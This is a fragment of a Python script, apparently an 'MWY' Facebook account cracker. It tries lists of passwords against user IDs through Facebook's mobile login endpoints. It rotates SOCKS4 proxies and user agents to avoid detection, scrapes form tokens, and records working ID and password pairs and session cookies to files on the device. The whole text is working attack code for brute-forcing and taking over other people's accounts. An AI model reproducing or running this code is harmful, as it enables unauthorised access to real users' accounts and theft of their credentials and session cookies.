			po = ses.post(f"https://m.facebook.com/login/device-based/login/async/?api_key=321785136108017&auth_token=4b7ab68bc1873c78c505f0ae28aa6de2&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D321785136108017%26redirect_uri%3Dhttps%253A%252F%252Fwww.luvtrip.id%252Fsocial-callback%252Ffacebook%26scope%3Demail%26response_type%3Dcode%26state%3DLtLY3JDvvtvur2gFh6JAtl2BUtLTV4uwJu58A4KE%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D46e2adb0-b888-4da6-a3d7-72121d1dcfd1%26tp%3Dunspecified&refsrc=deprecated&app_id=321785136108017&cancel=https%3A%2F%2Fwww.luvtrip.id%2Fsocial-callback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DLtLY3JDvvtvur2gFh6JAtl2BUtLTV4uwJu58A4KE%23_%3D_&lwv=100",data=date, headers=head,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m [MWY-CP] {idf}|{pw}')
				open('/sdcard/MWY-CP.txt/'+cpc,'a').write(idf+' '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} [MWY-OK] {idf}|{pw} \n\033[1;32m COOKIES :\033[1;37m {koki}')
				open('/sdcard/MWY-OK.txt/'+okc,'a').write(idf+' '+pw+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r [MWY-2M] {P}{loop}{P}/{P}{len(id)}{P} OK{P}/{ok}{P} |{'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m [MWY-CP] {idf}|{pw} \n')
				open('/sdcard/MWY-CP.txt/'+cpc,'a').write(idf+' '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} [MWY-OK] {idf}|{pw} \n\033[1;32m COOKIES :\033[1;37m {koki}')
				open('/sdcard/MWY-OK.txt/'+okc,'a').write(idf+' '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()
